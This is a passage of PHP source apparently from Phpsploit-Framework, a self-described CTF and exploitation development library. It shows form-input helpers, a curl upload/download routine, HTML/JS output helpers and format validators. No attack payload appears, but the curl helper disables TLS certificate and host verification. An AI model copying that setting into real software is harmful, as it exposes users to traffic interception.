    public static function form_md5 ( $name , $security_code = null )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            if ( is_null ( $security_code ) ) {
                $_md5 = md5 ( self ::$_params[ $name ] );
            } else {
                $_md5 = md5 ( self ::$_params[ $name ] . $security_code );
            }
            return $_md5;
        }
        return null;
    }

    public static function form_boolean ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return boolval ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function form_int ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return intval ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function form_float ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return floatval ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function form_double ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return doubleval ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function form_string ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return strval ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function form_array ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return json_decode ( self ::$_params[ $name ] , true );
        }
        return null;
    }

    public static function form_object ( $name )
    {
        self ::init_form ();
        if ( isset( self ::$_params[ $name ] ) ) {
            return json_decode ( self ::$_params[ $name ] );
        }
        return null;
    }

    public static function get_save_directory_path ( $save_directory_path )
    {
        if ( is_null ( $save_directory_path ) ) {
            $save_directory_path = "./";
        }
        if ( ! is_string ( $save_directory_path ) ) {
            $save_directory_path = "./";
        }
        if ( strlen ( $save_directory_path ) <= 0 ) {
            $save_directory_path = "./";
        }
        if ( ( ! file_exists ( $save_directory_path ) ) || ( ! is_dir ( $save_directory_path ) ) ) {
            $save_directory_path = "./";
        }
        $save_directory_path = realpath ( $save_directory_path );
        return $save_directory_path;
    }

    public static function send ( $url , $data = array () , $files = array () , $is_download = false , $save_directory_path = null , $display_progress = 1 , $search_progress_id = "search_progress_id" , $search_errors_id = "search_errors_id" , $search_result_id = "search_result_id" )
    {
        if ( ( ! is_string ( $url ) ) || ( strlen ( $url ) <= 0 ) || ( ! is_array ( $data ) ) || ( ! is_array ( $files ) ) || ( ! is_bool ( $is_download ) ) ) {
            return false;
        }
        $save_directory_path = self ::get_save_directory_path ( $save_directory_path );
        if ( $save_directory_path === false ) {
            return false;
        }

        $ch = curl_init ();

        curl_setopt ( $ch , CURLOPT_SSL_VERIFYHOST , FALSE );
        curl_setopt ( $ch , CURLOPT_SSL_VERIFYPEER , FALSE );

        curl_setopt ( $ch , CURLOPT_URL , $url );

        if ( ! empty( $data ) ) {
            curl_setopt ( $ch , CURLOPT_POST , true );
            curl_setopt ( $ch , CURLOPT_POSTFIELDS , $data );
        }
        if ( ! empty( $files ) ) {
            foreach ( $files as $index => $file ) {
                $files[ $index ] = new CURLFile( $file );
            }
        }

        curl_setopt ( $ch , CURLOPT_RETURNTRANSFER , true );

        if ( ! empty( $is_download ) ) {

            $start_time = time ();
            $size       = 0;
            $rate       = 0;
            $flag       = 0;
            $_filename  = self ::filename ( $url );
            $_extname   = self ::extname ( $_filename );
            $_filename  = ( ( is_null ( $_filename ) ) || ( $_filename == "" ) ) ? ( "_." . time () . ".phpsploit" ) : ( $_filename . "." . time () . ".phpsploit" . ( ( is_string ( $_extname ) && ( strlen ( $_extname ) > 0 ) ) ? ( chr ( 46 ) . $_extname ) : ( "" ) ) );

            curl_setopt ( $ch , CURLOPT_WRITEFUNCTION , function ( $ch , $str ) use ( &$flag , &$size , &$rate , &$url , &$_filename , &$save_directory_path , &$display_progress , &$start_time , &$search_progress_id , &$search_errors_id , &$search_result_id ) {

                try {
                    Class_Base_Response ::check_browser_service_stop ();
                } catch ( \Throwable $e ) {
                    Class_Base_Response ::outputln ( $e );
                    exit( 1 );
                }

                $len = strlen ( $str );

                if ( $rate == 0 ) {

                    $size = curl_getinfo ( $ch , CURLINFO_CONTENT_LENGTH_DOWNLOAD );

                    $type = curl_getinfo ( $ch , CURLINFO_CONTENT_TYPE );

                    $httpcode = curl_getinfo ( $ch , CURLINFO_HTTP_CODE );
                }

                $rate += $len;

                if ( ( file_exists ( $save_directory_path ) ) && ( is_dir ( $save_directory_path ) ) ) {
                    $_filepath = $save_directory_path . "/" . $_filename;
                    file_put_contents ( $_filepath , $str , FILE_APPEND | LOCK_EX );
                    if ( ! empty( $display_progress ) ) {
                        if ( ! is_cli () ) {
                            Class_Base_Response ::output_div_inner_html ( $search_progress_id , ( "file path : " . $_filepath . " , file size : " . $size . " , rate : " . $rate . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                        } else {
                            Class_Base_Response ::outputln ( "Download progress in file path : " . $_filepath . " , file size : " . $size . " , rate : " . $rate . "\n" );
                        }
                    }
                    if ( $rate >= $size ) {
                        $_end_time  = time ();
                        $_exec_time = ( $_end_time - $start_time );
                        if ( file_exists ( $_filepath ) && ( is_file ( $_filepath ) ) ) {
                            $_file_size = Class_Base_File ::get_file_size ( $_filepath );
                            $_file_type = Class_Base_File ::get_mime_content_type ( $_filepath );
                            if ( ! is_cli () ) {
                                Class_Base_Response ::output_div_inner_html ( $search_result_id , ( "\n" . 'File download completed, taking ' . $_exec_time . ' seconds, file size ( ' . $_file_size . ' bytes ), file type ( ' . $_file_type . ' ), file save path ( <a href="' . Class_Base_Format ::htmlentities ( Class_Base_Response ::get_url ( "/file/detail" , array ( "file_path" => $_filepath ) ) ) . '">' . $_filepath . '</a> ) . ' . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            } else {
                                Class_Base_Response ::outputln ( "\n" . 'File download completed, taking ' . $_exec_time . ' seconds, file size ( ' . $_file_size . ' bytes ), file type ( ' . $_file_type . ' ), file save path ( ' . $_filepath . ' ) . ' . "\n" );
                            }
                        } else {
                            if ( ! is_cli () ) {
                                Class_Base_Response ::output_div_inner_html ( $search_errors_id , ( "\n" . '<span style="color:red;">File download failed, took ( ' . $_exec_time . ' seconds), download data size ( ' . $size . ' bytes) , downloaded data size ( ' . $rate . ' bytes)</span>' . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_COVER );
                            } else {
                                Class_Base_Response ::outputln ( "\n" . 'File download failed, took ( ' . $_exec_time . ' seconds), download data size ( ' . $size . ' bytes) , downloaded data size ( ' . $rate . ' bytes)' . "\n" );
                            }
                        }
                        return $len;
                    }
                }
                return $len;
            } );
        }
        $result = curl_exec ( $ch );
        curl_close ( $ch );
        return $result;
    }

    public static function filename ( $url )
    {
        $url      = str_replace ( "\\" , "/" , $url );
        $position = strripos ( $url , '/' );
        if ( $position === false ) {
            $position = 0;
        }
        if ( $position == ( strlen ( $url ) - 1 ) ) {
            return null;
        }
        $filename = substr ( $url , ( $position + 1 ) , ( strlen ( $url ) - ( $position + 1 ) ) );
        return $filename;
    }

    public static function extname ( $filename )
    {
        $position = strripos ( $filename , '.' );
        if ( $position === false ) {
            return null;
        }
        if ( $position == ( strlen ( $filename ) - 1 ) ) {
            return null;
        }
        $extname = substr ( $filename , ( $position + 1 ) , ( strlen ( $filename ) - ( $position + 1 ) ) );

        return $extname;
    }

    public static function create_folder ( $name = "tmp" )
    {
        $name = str_replace ( "\\" , "/" , $name );
        while ( strpos ( $name , "../" ) !== false ) {
            $name = str_replace ( "../" , "" , $name );
        }
        if ( $name == "" ) {
            $name = time ();
        }
        if ( substr ( $name , 0 , 1 ) == "/" ) {
            if ( strlen ( $name ) == 1 ) {
                $name = time ();
            } else {
                $name = substr ( $name , 1 );
            }
        }
        $name = "./" . $name;
        if ( file_exists ( $name ) && is_dir ( $name ) ) {
            return $name;
        }
        $bool = mkdir ( $name , 0700 , true );
        if ( ! $bool ) {
            return null;
        }
        return $name;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Response extends Class_Base implements Interface_Base_Response
{
    const FLAG_JS_CONTENT_INNER_HTML_COVER  = "cover";
    const FLAG_JS_CONTENT_INNER_HTML_APPEND = "append";

    private static $_output_json_flag                           = 0;
    private static $_output_flag                                = 0;
    private static $_cli_check_enable_license_agreement_filters = array ();

    public static function json ( $data )
    {
        return json_encode ( $data , JSON_PRETTY_PRINT );
    }

    public static function text ( $data )
    {
        if ( is_object ( $data ) || is_array ( $data ) ) {
            $data = json_encode ( $data , JSON_PRETTY_PRINT );
        }
        if ( is_null ( $data ) ) {
            $data = "";
        }
        return strval ( $data );
    }

    public static function output ( $data , $format = "text" , $is_convert_line_breaks = 1 )
    {
        if ( is_null ( $data ) ) {
            $data = "";
        }
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            ob_implicit_flush ( 1 );
        }
        $_format = strtolower ( strval ( $format ) );
        if ( ( ! is_cli () ) ) {
            echo ( str_pad ( "" , 8192 , "\0" ) );
            if ( ( $_format == "text" ) && ( ! empty( $is_convert_line_breaks ) ) ) {
                $data = str_replace ( "\n" , "</br>" , $data );
            }
        }
        if ( $_format == "text" ) {
            print_r ( self::text ( $data ) );
        } else if ( $_format == "json" ) {
            print_r ( self::json ( $data ) );
        } else if ( ( $format == "array" ) || ( $format == "object" ) ) {
            print_r ( ( $data ) );
        }
        if ( is_cli () ) {
            echo ( "\n" );
        }
        if ( ( ! is_cli () ) ) {
            flush ();
        }
    }

    public static function outputln ( $data , $title = null , $format = "text" , $is_convert_line_breaks = 1 )
    {
        if ( is_null ( $title ) ) {
            $data = print_r ( $data , true ) . "\n";
        } else {
            $data = strval ( $title ) . chr ( 32 ) . print_r ( $data , true ) . "\n";
        }
        self::output ( $data , $format , $is_convert_line_breaks );
    }

    public static function header ( $type = "text" )
    {
        if ( ! is_cli () && ( ! self::$_output_json_flag ) && ( ! self::$_output_flag ) ) {
            if ( $type == "json" ) {
                @header ( "Content-type: application/json; charset=utf-8" );
                @header ( "HTTP/1.1 200" );
                @header ( "Cache-Control: no-store, no-cache" );
                @header ( "Last-Modified: " . gmdate ( "D, d M Y H:i:s" , time () ) . " GMT" );
                self::$_output_json_flag = 1;
                self::$_output_flag      = 1;
            }
        }
    }

    public static function get_http_referer ( $is_encode = 0 )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( empty( $_SERVER[ "HTTP_REFERER" ] ) ) {
            $_SERVER[ "HTTP_REFERER" ] = ( self::_get_url ( "/index" , array ( "http_referer" => "" ) ) );
        }
        if ( ! empty( $is_encode ) ) {
            $_http_referer = ( urlencode ( $_SERVER[ "HTTP_REFERER" ] ) );
        } else {
            $_http_referer = ( $_SERVER[ "HTTP_REFERER" ] );
        }
        return $_http_referer;
    }

    private static function _get_url ( $action , $params = null )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! empty( $action ) ) {
            if ( substr ( $action , 0 , 1 ) != "/" ) {
                $action = "/" . $action;
            }
            $_index_file_name = INDEX_FILE_URI;
            $_url             = $_index_file_name . '?url=' . $action;
            if ( ( ! empty( $params ) ) && ( is_array ( $params ) ) ) {
                foreach ( $params as $k => $v ) {
                    if ( is_string ( $k ) && ( ! Class_Base_Format::is_integer ( $k ) ) ) {
                        $_url .= '&' . $k . '=' . urlencode ( $v );
                    }
                }
            }
            $_url .= '&rand=' . rand ( 100000000000000000 , 999999999999999999 );
            $_url .= '&csrf=' . ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] ) ? ( $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] = ( time () . rand ( 10000000 , 99999999 ) ) ) : $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] );
            $_url .= '&debug=' . ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) ? ( 0 ) : ( $_SESSION[ "PHPSPLOIT_PERMISSION_DEBUG" ] ) );
            return $_url;
        }
        return null;
    }

    public static function get_url ( $action , $params = null )
    {
        if ( ! empty( $action ) ) {
            $_url = self::_get_url ( $action , $params );
            if ( ! empty( $_url ) ) {
                return $_url;
            }
        }
        return null;
    }

    public static function get_cli_url ( $action , $params = null )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! empty( $action ) ) {
            if ( substr ( $action , 0 , 1 ) != "/" ) {
                $action = "/" . $action;
            }
            $_index = 0;
            $_url   = ( $action . '?' );
            if ( ( ! empty( $params ) ) && ( is_array ( $params ) ) ) {
                foreach ( $params as $k => $v ) {
                    if ( is_string ( $k ) && ( ! Class_Base_Format::is_integer ( $k ) ) ) {
                        if ( $_index == 0 ) {
                            $_url .= ( $k . '=' . urlencode ( $v ) );
                        } else {
                            $_url .= ( '&' . $k . '=' . urlencode ( $v ) );
                        }
                        $_index ++;
                    }
                }
            }
            if ( empty( $params ) ) {
                $_url .= 'md5_token=' . ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) );
            } else {
                $_url .= '&md5_token=' . ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) );
            }
            if ( ! in_array ( $action , self::$_cli_check_enable_license_agreement_filters ) ) {
                $_url .= '&is_enable_license_agreement=' . ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_IS_ENABLE_LICENSE_AGREEMENT" ] ) );
            }
            $_url .= '&debug=1';
            return $_url;
        }
        return null;
    }

    public static function get_urlencode ( $_cli_url )
    {
        $_cli_encode_url = urlencode ( $_cli_url );
        return $_cli_encode_url;
    }

    public static function get_encode_cli_url ( $action , $params = null )
    {
        $_cli_url        = self::get_cli_url ( $action , $params );
        $_cli_encode_url = self::get_urlencode ( $_cli_url );
        return $_cli_encode_url;
    }

    public static function redirect ( $action , $params = null )
    {
        if ( ! is_cli () ) {
            if ( ! empty( $action ) ) {
                $_url = self::get_url ( $action , $params );
                if ( ! empty( $_url ) ) {
                    @header ( "Location: $_url" );
                }
            }
        }
    }

    public static function output_console_log ( $content )
    {
        $content         = urlencode ( $content );
        $_js_console_log = '<script type="text/javascript">console.log(urldecode("' . str_replace ( "\t" , '\t' , str_replace ( "\"" , "\\\"" , $content ) ) . '")+"\n");</script>';
        self::output ( $_js_console_log , "text" , 0 );
    }

    public static function output_textarea_inner_html ( $id , $content , $flag = self::FLAG_JS_CONTENT_INNER_HTML_COVER )
    {
        $content = urlencode ( $content );
        if ( $flag == self::FLAG_JS_CONTENT_INNER_HTML_APPEND ) {
            $_js_div_inner_html = '<script type="text/javascript">window.document.getElementById("' . str_replace ( "\"" , "\\\"" , $id ) . '").innerHTML+=(urldecode("' . $content . '"))+"\n";</script>';
        } else {
            $_js_div_inner_html = '<script type="text/javascript">window.document.getElementById("' . str_replace ( "\"" , "\\\"" , $id ) . '").innerHTML=(urldecode("' . $content . '"))+"\n";</script>';
        }
        self::output ( $_js_div_inner_html , "text" , 0 );
    }

    public static function output_div_inner_html ( $id , $content , $flag = self::FLAG_JS_CONTENT_INNER_HTML_COVER )
    {
        $content = urlencode ( $content );
        if ( $flag == self::FLAG_JS_CONTENT_INNER_HTML_APPEND ) {
            $_js_div_inner_html = '<script type="text/javascript">window.document.getElementById("' . str_replace ( "\"" , "\\\"" , $id ) . '").innerHTML+="<div>"+urldecode("' . str_replace ( "\t" , '\t' , str_replace ( "\"" , "\\\"" , $content ) ) . '")+"</div></br>";</script>';
        } else {
            $_js_div_inner_html = '<script type="text/javascript">window.document.getElementById("' . str_replace ( "\"" , "\\\"" , $id ) . '").innerHTML=urldecode("' . str_replace ( "\t" , '\t' , str_replace ( "\"" , "\\\"" , $content ) ) . '");</script>';
        }
        self::output ( $_js_div_inner_html , "text" , 1 );
    }

    public static function output_link_label ( $href , $id , $title , $description = "" , $style = "" )
    {
        Class_Base_Response::outputln ( '<a id="' . Class_Base_Format::htmlentities ( $id ) . '" style="font-size:18px;' . Class_Base_Format::htmlentities ( $style ) . '" href="' . Class_Base_Format::htmlentities ( $href ) . '" title="' . Class_Base_Format::htmlentities ( $description ) . '">' . Class_Base_Format::htmlentities ( $title ) . '</a>' );
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            echo ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( "Client browser disconnected ! " , Class_Base_Error::NETWORK_EXCEPTION_CLIENT_DISCONNECTED );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-2
 * Time: 下午5:33
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Format extends Class_Base implements Interface_Base_Format
{
    const TYPE_DATA_TEXT  = 10000001;
    const TYPE_DATA_BIN   = 10000002;
    const TYPE_FILE_IMAGE = 10000003;
    const TYPE_FILE_AUDIO = 10000004;
    const TYPE_FILE_VIDEO = 10000005;

    const TYPE_FIELD_CONVENTIONAL = "conventional";
    const TYPE_FIELD_VAR          = "var";

    private static $_field_name_conventional_matchings  = array ( 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' , '0' , '1' , '2' , '3' , '4' , '5' , '6' , '7' , '8' , '9' , '_' );
    private static $_field_name_var_head_char_matchings = array ( 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' , '_' );
    private static $_field_name_var_matchings           = array ( 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' , '0' , '1' , '2' , '3' , '4' , '5' , '6' , '7' , '8' , '9' , '_' );
    private static $_type_fields                        = array (
        self::TYPE_FIELD_CONVENTIONAL ,
        self::TYPE_FIELD_VAR ,
    );
    private static $_file_name_conventional_matchings   = array ( 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' , '0' , '1' , '2' , '3' , '4' , '5' , '6' , '7' , '8' , '9' , '_' , '.' );

    public static function is_empty ( $data )
    {
        if ( is_string ( $data ) ) {
            $data = str_replace ( "\0" , "" , $data );
        }
        $_bool = empty( $data );
        return $_bool;
    }

    public static function is_empty_string ( $data )
    {
        if ( is_string ( $data ) ) {
            $data = str_replace ( "\0" , "" , $data );
        }
        if ( $data == "" ) {
            return true;
        }
        return false;
    }

    public static function is_field_name ( $field_name , $field_name_limit_length = 255 , $field_type = self::TYPE_FIELD_CONVENTIONAL )
    {
        if ( ! is_string ( $field_name ) ) {
            return false;
        }
        $field_name_length = strlen ( $field_name );
        if ( $field_name_length > $field_name_limit_length ) {
            return false;
        }
        if ( ! in_array ( $field_type , self::$_type_fields ) ) {
            return false;
        }
        for ( $field_name_index = 0 ; $field_name_index < $field_name_length ; $field_name_index ++ ) {
            $_field_name_index_char = substr ( $field_name , $field_name_index , 1 );
            if ( $field_type == self::TYPE_FIELD_CONVENTIONAL ) {
                if ( ! in_array ( $_field_name_index_char , self::$_field_name_conventional_matchings ) ) {
                    return false;
                }
            }
            if ( $field_type == self::TYPE_FIELD_VAR ) {
                if ( $field_name_index == 0 ) {
                    if ( ! in_array ( $_field_name_index_char , self::$_field_name_var_head_char_matchings ) ) {
                        return false;
                    }
                } else {
                    if ( ! in_array ( $_field_name_index_char , self::$_field_name_var_matchings ) ) {
                        return false;
                    }
                }
            }
        }
        return true;
    }

    public static function is_directory ( $file_path )
    {
        if ( is_string ( $file_path ) ) {
            if ( file_exists ( $file_path ) ) {
                if ( is_dir ( $file_path ) ) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function is_file ( $file_path )
    {
        if ( is_string ( $file_path ) ) {
            if ( file_exists ( $file_path ) ) {
                if ( is_file ( $file_path ) ) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function is_text_file ( $file_path )
    {
        if ( ! self::is_file ( $file_path ) ) {
            throw new \Exception( ( print_r ( $file_path , true ) . " is not a valid file" ) , 0 );
        }
        $_file_type = mime_content_type ( $file_path );
        if ( $_file_type === false ) {
            throw new \Exception( ( "Failed to obtain file type for " . print_r ( $file_path , true ) ) , 0 );
        }
        if ( ( strlen ( $_file_type ) > 5 ) && ( substr ( $_file_type , 0 , 5 ) == "text/" ) ) {
            return true;
        }
        return false;
    }

    public static function is_image_file ( $file_path )
    {
        if ( ! self::is_file ( $file_path ) ) {
            throw new \Exception( ( print_r ( $file_path , true ) . " is not a valid file" ) , 0 );
        }
        $_file_type = mime_content_type ( $file_path );
        if ( $_file_type === false ) {
            throw new \Exception( ( "Failed to obtain file type for " . print_r ( $file_path , true ) ) , 0 );
        }
        if ( ( strlen ( $_file_type ) > 6 ) && ( substr ( $_file_type , 0 , 6 ) == "image/" ) ) {
            return true;
        }
        return false;
    }

    public static function is_audio_file ( $file_path )
    {
        if ( ! self::is_file ( $file_path ) ) {
            throw new \Exception( ( print_r ( $file_path , true ) . " is not a valid file" ) , 0 );
        }
        $_file_type = mime_content_type ( $file_path );
        if ( $_file_type === false ) {
            throw new \Exception( ( "Failed to obtain file type for " . print_r ( $file_path , true ) ) , 0 );
        }
        if ( ( strlen ( $_file_type ) > 6 ) && ( substr ( $_file_type , 0 , 6 ) == "audio/" ) ) {
            return true;
        }
        return false;
    }

    public static function is_video_file ( $file_path )
    {
        if ( ! self::is_file ( $file_path ) ) {
            throw new \Exception( ( print_r ( $file_path , true ) . " is not a valid file" ) , 0 );
        }
        $_file_type = mime_content_type ( $file_path );
        if ( $_file_type === false ) {
            throw new \Exception( ( "Failed to obtain file type for " . print_r ( $file_path , true ) ) , 0 );
        }
        if ( ( strlen ( $_file_type ) > 6 ) && ( substr ( $_file_type , 0 , 6 ) == "video/" ) ) {
            return true;
        }
        return false;
    }

    public static function is_bin_file ( $file_path )
    {
        if ( ! self::is_file ( $file_path ) ) {
            throw new \Exception( ( print_r ( $file_path , true ) . " is not a valid file" ) , 0 );
        }
        $_file_type = mime_content_type ( $file_path );
        if ( $_file_type === false ) {
            throw new \Exception( ( "Failed to obtain file type for " . print_r ( $file_path , true ) ) , 0 );
        }
        if ( ( strlen ( $_file_type ) > 12 ) && ( substr ( $_file_type , 0 , 12 ) == "application/" ) ) {
            return true;
        }
        return false;
    }

    public static function string_to_content ( $string , $size )
    {
        $_string = self::string_to_data ( $string , $size );
        return $_string;
    }

    public static function content_to_string ( $string )
    {
        $_string = self::data_to_string ( $string );
        return $_string;
    }

    public static function string_to_data ( $string , $size )
    {
        if ( is_null ( $string ) ) {
            $string = "";
        }
        $_strlen = strlen ( $string );
        if ( empty( $_strlen ) ) {
            $string = str_repeat ( "\0" , $size );
        } else if ( $_strlen > $size ) {
            $string = substr ( $string , 0 , $size );
        } else {
            $string = str_pad ( $string , $size , self::ASCII_CODE_ZERO , STR_PAD_RIGHT );
        }
        return $string;
    }

    public static function data_to_string ( $data )
    {
        $_data = str_replace ( "\0" , "" , $data );
        return $_data;
    }

    public static function is_min_to_max_integer ( $integer , $min , $max )
    {
        $_min_length = strlen ( $min );
        $_max_length = strlen ( $max );
        if ( ! self::is_minlen_to_maxlen_integer ( $integer , $_min_length , $_max_length ) ) {
            return false;
        }
        $integer = intval ( $integer );
        if ( ( $integer < $min ) || ( $integer > $max ) ) {
            return false;
        }
        return true;
    }

    public static function is_minlen_to_maxlen_string ( $string , $min = self::STRING_MIN_LENGTH , $max = self::STRING_MAX_LENGTH )
    {
        if ( ! is_string ( $string ) ) {
            if ( ! is_integer ( $string ) ) {
                return false;
            }
            $string = strval ( $string );
        }
        $string  = str_replace ( "\0" , "" , $string );
        $_length = strlen ( $string );
        if ( ( $_length >= $min ) && ( $_length <= $max ) ) {
            return true;
        }
        return false;
    }

    public static function is_integer ( $integer )
    {
        if ( is_string ( $integer ) ) {
            $integer = str_replace ( "\0" , "" , $integer );
            $length  = strlen ( $integer );
            if ( $length <= 0 ) {
                return false;
            }
            for ( $index = 0 ; $index < $length ; $index ++ ) {
                $_char = substr ( $integer , $index , 1 );
                if ( ( $_char != '0' ) && ( $_char != '1' ) && ( $_char != '2' ) && ( $_char != '3' ) && ( $_char != '4' ) && ( $_char != '5' ) && ( $_char != '6' ) && ( $_char != '7' ) && ( $_char != '8' ) && ( $_char != '9' ) ) {
                    return false;
                }
            }
            return true;
        } else {
            $_ret = is_integer ( $integer );
            return $_ret;
        }
    }

    public static function is_minlen_to_maxlen_integer ( $integer , $min = self::INTEGER_MIN_LENGTH , $max = self::INTEGER_MAX_LENGTH )
    {
        if ( ! is_string ( $integer ) ) {
            $integer = strval ( $integer );
        }
        $integer = str_replace ( "\0" , "" , $integer );
        $_length = strlen ( $integer );
        if ( ( $_length > 1 ) && ( substr ( $integer , 0 , 1 ) == '0' ) ) {
            return false;
        }
        if ( ( $_length >= $min ) && ( $_length <= $max ) ) {
            if ( self::is_integer ( $integer ) ) {
                return true;
            }
        }
        return false;
    }

    public static function is_oct ( $oct )
    {
        if ( ! is_string ( $oct ) ) {
            if ( ! is_integer ( $oct ) ) {
                return false;
            }
            $oct = strval ( $oct );
        }
        $oct    = str_replace ( "\0" , "" , $oct );
        $length = strlen ( $oct );
        if ( $length <= 0 ) {
            return false;
        }
        for ( $index = 0 ; $index < $length ; $index ++ ) {
            $_char = substr ( $oct , $index , 1 );
            if ( ( $_char != '0' ) && ( $_char != '1' ) && ( $_char != '2' ) && ( $_char != '3' ) && ( $_char != '4' ) && ( $_char != '5' ) && ( $_char != '6' ) && ( $_char != '7' ) ) {
                return false;
            }
        }
        return true;
    }

    public static function is_minlen_to_maxlen_oct ( $oct , $min = self::OCT_MIN_LENGTH , $max = self::OCT_MAX_LENGTH )
    {
        if ( ! is_string ( $oct ) ) {
            $oct = strval ( $oct );
        }
        $oct     = str_replace ( "\0" , "" , $oct );
        $_length = strlen ( $oct );
        if ( ( $_length >= $min ) && ( $_length <= $max ) ) {
            if ( self::is_oct ( $oct ) ) {
                return true;
            }
        }
        return false;
    }

    public static function is_hex ( $hex )
    {
        if ( ! is_string ( $hex ) ) {
            if ( ! is_integer ( $hex ) ) {
                return false;
            }
            $hex = strval ( $hex );
        }
        $hex = str_replace ( "\0" , "" , $hex );
        $hex = strtolower ( $hex );
        if ( ( strlen ( $hex ) > 2 ) && ( ( substr ( $hex , 0 , 2 ) == "0x" ) ) ) {
            $hex = substr ( $hex , 2 );
        }
        $_length = strlen ( $hex );
        if ( $_length <= 0 ) {
            return false;
        }
        for ( $index = 0 ; $index < $_length ; $index ++ ) {
            $_char = substr ( $hex , $index , 1 );
            if ( ( $_char != '0' ) && ( $_char != '1' ) && ( $_char != '2' ) && ( $_char != '3' ) && ( $_char != '4' ) && ( $_char != '5' ) && ( $_char != '6' ) && ( $_char != '7' ) && ( $_char != '8' ) && ( $_char != '9' ) && ( $_char != 'a' ) && ( $_char != 'b' ) && ( $_char != 'c' ) && ( $_char != 'd' ) && ( $_char != 'e' ) && ( $_char != 'f' ) ) {
                return false;
            }
        }
        return true;
    }

    public static function is_min_to_max_hex ( $hex , $min = self::HEX_MIN_VALUE , $max = self::HEX_KEY_MAX_VALUE )
    {
        if ( is_string ( $hex ) ) {
            if ( ! self::is_hex ( $hex ) ) {
                return false;
            }
            $_num = self::hex_to_dec ( $hex );
        }
        if ( ( ! is_integer ( $min ) ) || ( ! is_integer ( $max ) ) ) {
            return false;
        }
